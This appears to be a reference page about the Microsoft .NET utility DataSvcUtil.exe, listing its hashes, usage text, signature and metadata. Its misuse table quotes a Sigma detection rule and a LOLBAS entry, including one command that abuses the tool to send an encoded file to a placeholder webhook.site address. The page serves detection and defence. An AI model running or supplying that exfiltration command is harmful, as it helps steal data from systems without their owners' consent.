---
title: DataSvcUtil.exe | DataSvcUtil.exe
excerpt: What is DataSvcUtil.exe?
---

# DataSvcUtil.exe 

* File Path: `C:\Windows\Microsoft.NET\Framework\v4.0.30319\DataSvcUtil.exe`
* Description: DataSvcUtil.exe
* Comments: DataSvcUtil.exe


## Hashes

Type | Hash
-- | --
MD5 | `DFFCFFD134C4F8540A828A2C7AFE3A7A`
SHA1 | `8337BE23C4C73166D800EBC3096BEA866CFF177A`
SHA256 | `09165924FF4DA0BC6F58BA60C9EFF597907929B200A4A18FF1978263F5A40631`
SHA384 | `A82B3EA93F3D563B6861769057BA0FDE9CAAA4801EEEFDB1C81E5DF00DDA18EE3F8D400E1D60823B3815DEC03B518DC3`
SHA512 | `1F1512C7BBC157CE01891DF8547E3B0C9D05051B3F89A86D8E7764857FD79570FDC34C9F7A7F17B3B34456AF747E19F0F34E8F23A9EFEDD53F058072E233B3DB`
SSDEEP | `768:Ysp38EZc9l509m4LdwbKekWXAMdjr8b6Iq8jMgqS/i3G0oqWlP8S42:YG2P5/jb4WXNdn8SHS+GTiS42`
IMP | `F34D5F2D4577ED6D9CEEC516C1F5A744`
PESHA1 | `755A13B035C75A8E7719639E3C6E04DD7E528000`
PE256 | `9587B6248DB5ED97F6AC04AF230D3AC7F522AB68C7D47E8129957C63B6355F50`

## Runtime Data

### Usage (stdout):
```cmhg
DataSvcUtil for Microsoft (R) .NET Framework version 4.8.4084.0
Copyright (C) Microsoft Corporation. All rights reserved.

                              DataSvcUtil Options
/in:<file>               The file to read the conceptual model from
/out:<file>              The file to write the generated object layer to
/language:CSharp         Generate code using the C# language
/language:VB             Generate code using the VB language
/Version:1.0             Accept CSDL documents tagged with
                         m:DataServiceVersion=1.0 or lower
/Version:2.0             Accept CSDL documents tagged with
                         m:DataServiceVersion=2.0 or lower
/DataServiceCollection   Generate collections derived from DataServiceCollection/uri:<URL>               The URI to read the conceptual model from
/help                    Display the usage message (short form: /?)
/nologo                  Suppress copyright message

                                    Examples
To generate code from a data service.
  DataSvcUtil /out:"data.cs" /uri:"http://localhost/data.svc"

To generate code from a conceptual model file.
  DataSvcUtil /out:"data.cs" /in:"file.csdl"

To generate code from a entity design model file.
  DataSvcUtil /out:"data.cs" /in:"file.edmx"


```

### Loaded Modules:

Path |
-- |
C:\Windows\Microsoft.NET\Framework\v4.0.30319\DataSvcUtil.exe |
C:\Windows\System32\KERNEL32.dll |
C:\Windows\System32\KERNELBASE.dll |
C:\Windows\SYSTEM32\MSCOREE.DLL |
C:\Windows\SYSTEM32\ntdll.dll |


## Signature

* Status: Signature verified.
* Serial: `330000023241FB59996DCC4DFF000000000232`
* Thumbprint: `FF82BC38E1DA5E596DF374C53E3617F7EDA36B06`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: DataSvcUtil.exe
* Product Name: Microsoft .NET Framework
* Company Name: Microsoft Corporation
* File Version: 4.8.4084.0
* Product Version: 4.8.4084.0
* Language: Language Neutral
* Legal Copyright:  Microsoft Corporation.  All rights reserved.
* Machine Type: 32-bit

## File Scan

* VirusTotal Detections: 0/75
* VirusTotal Link: https://www.virustotal.com/gui/file/09165924ff4da0bc6f58ba60c9eff597907929b200a4a18ff1978263f5a40631/detection

## File Similarity (ssdeep match)

File | Score
-- | --
[C:\Windows\Microsoft.NET\Framework64\v4.0.30319\DataSvcUtil.exe](DataSvcUtil.exe-DFFCFFD134C4F8540A828A2C7AFE3A7A.md) | 100

## Possible Misuse

*The following table contains possible examples of `DataSvcUtil.exe` being misused. While `DataSvcUtil.exe` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_lolbas_data_exfiltration_by_using_datasvcutil.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_lolbas_data_exfiltration_by_using_datasvcutil.yml) | `title: LOLBAS Data Exfiltration by DataSvcUtil.exe`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_lolbas_data_exfiltration_by_using_datasvcutil.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_lolbas_data_exfiltration_by_using_datasvcutil.yml) | `description: Detects when a user performs data exfiltration by using DataSvcUtil.exe`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_lolbas_data_exfiltration_by_using_datasvcutil.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_lolbas_data_exfiltration_by_using_datasvcutil.yml) | `- https://docs.microsoft.com/en-us/dotnet/framework/data/wcf/wcf-data-service-client-utility-datasvcutil-exe`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_lolbas_data_exfiltration_by_using_datasvcutil.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_lolbas_data_exfiltration_by_using_datasvcutil.yml) | `- '\DataSvcUtil.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_lolbas_data_exfiltration_by_using_datasvcutil.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_lolbas_data_exfiltration_by_using_datasvcutil.yml) | `- DataSvcUtil.exe being used may be performed by a system administrator. `{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_lolbas_data_exfiltration_by_using_datasvcutil.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_lolbas_data_exfiltration_by_using_datasvcutil.yml) | `- DataSvcUtil.exe being executed from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule.`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [DataSvcUtil.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/DataSvcUtil.yml) | `Name: DataSvcUtil.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [DataSvcUtil.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/DataSvcUtil.yml) | `Description: DataSvcUtil.exe is a command-line tool provided by WCF Data Services that consumes an Open Data Protocol (OData) feed and generates the client data service classes that are needed to access a data service from a .NET Framework client application.`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [DataSvcUtil.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/DataSvcUtil.yml) | `- Command: DataSvcUtil /out:C:\\Windows\\System32\\calc.exe /uri:https://webhook.site/xxxxxxxxx?encodedfile`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [DataSvcUtil.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/DataSvcUtil.yml) | `- Path: C:\Windows\Microsoft.NET\Framework64\v3.5\DataSvcUtil.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [DataSvcUtil.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/DataSvcUtil.yml) | `- IOC: The DataSvcUtil.exe tool is installed in the .NET Framework directory.`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [DataSvcUtil.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/DataSvcUtil.yml) | `- IOC: Preventing/Detecting DataSvcUtil with non-RFC1918 addresses by Network IPS/IDS.`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [DataSvcUtil.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/DataSvcUtil.yml) | `- IOC: Monitor process creation for non-SYSTEM and non-LOCAL SERVICE accounts launching DataSvcUtil.`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [DataSvcUtil.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/DataSvcUtil.yml) | `- Link: https://docs.microsoft.com/en-us/dotnet/framework/data/wcf/wcf-data-service-client-utility-datasvcutil-exe`{:.highlight .language-yaml} | 



MIT License. Copyright (c) 2020-2021 Strontic.


